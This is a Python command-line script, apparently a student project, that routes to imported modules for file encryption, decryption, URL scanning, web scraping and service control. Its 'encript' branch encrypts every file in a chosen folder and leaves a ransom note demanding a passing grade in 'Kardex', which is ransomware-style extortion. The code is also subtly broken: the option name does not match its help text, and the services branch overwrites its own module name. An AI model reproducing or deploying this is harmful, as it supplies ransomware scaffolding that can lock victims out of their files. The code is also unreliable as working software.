#imports
import argparse
import logging
#Imports for my files
import encriptador
import decrypt
import web_scraping
import services
import urlscaner
import os

if __name__ == '__main__':
    #Creacion de erchivo logs
    logging.basicConfig(filename = 'logs.log', level = logging.INFO)
    
    parser = argparse.ArgumentParser()
    #parser.add_argument('--encrypt', help = "Encrypt Function")
    #parser.add_argument('--decrypt', help = "Decrypr Function")
    #parser.add_argument('--url_scanner', help = "URLScan Function")
    #parser.add_argument('--web_scraping', help = "Web Scraping Function")
    parser.add_argument('--action', required=True , help = "Select encrypt, decrypt, urlscan, web_scraping, services")
    args = parser.parse_args()
    
option=args.action

if option == "encript":
    path=str(input("Ruta absoluta de la carpeta: "))
    items=os.listdir(path)
    archivos= [path+"\\"+x for x in items]
    
    encriptador.paths(path)
    encriptador.genera_key()
    key = encriptador.return_key()
    encriptador.encrypt(archivos,key)
    
    with open(path+"\\"+"readme.txt",'w') as file:
        file.write("Te he hackeado y encriptado tus archivos\n")
        file.write("Para recuperarlos colocar calificaion aprovatoria en Kardex\n")
        file.write("By Kr0nn0s")
        
elif option == "decrypt":
    with open("ruta.txt",'r') as file:
        path = file.read()
        
    os.remove(path+"\\"+"readme.txt")
    items=os.listdir(path)
    archivos=[path+"\\"+x for x in items]
        
    key=decrypt.return_key()
    decrypt.decrypt(archivos,key)
elif option == "urlscan":
    api=str(input("Ingrese su api key: "))
    url=str(input("Ingrese la url a escanear: "))

    urls=urlscaner.validar(url)
    r=urlscaner.analisis(api,urls)
    urlscaner.report(r)
    urlscaner.auto_open()
elif option == "web_scraping":
    url=str(input("Ingrese la url para el web scraping: "))
    
    urls=web_scraping.validate(url)
    web_scraping.web_scraping(urls)
    web_scraping.auto_open()
elif option == "services":
    command=str(input("Ingrese su comando: "))
    services=str(input("Ingrese el servicio: "))
    
    services.service(command,services)
